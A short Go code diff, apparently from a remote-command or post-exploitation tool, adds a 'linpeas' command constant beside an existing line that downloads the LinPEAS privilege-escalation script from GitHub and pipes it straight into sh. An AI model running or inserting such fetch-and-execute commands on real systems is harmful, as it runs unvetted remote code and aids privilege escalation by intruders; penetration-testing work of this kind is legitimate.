@@ -13,6 +13,10 @@ const commandFormat = "curl https://raw.githubusercontent.com/carlospolop/" +
 	"privilege-escalation-awesome-scripts-suite/master/linPEAS/" +
 	"linpeas.sh | sh && echo '%s\n'\n"
 
+// LinPeasCommand is a constant that holds the expected string for linpeas execution in
+// a websocket.Command message.
+const LinPeasCommand = "linpeas"
+
 // LinPeas allows for the execution of LinPEAS. LinPEAS is a script
 // to search for possible local privilege escalation paths
 // https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
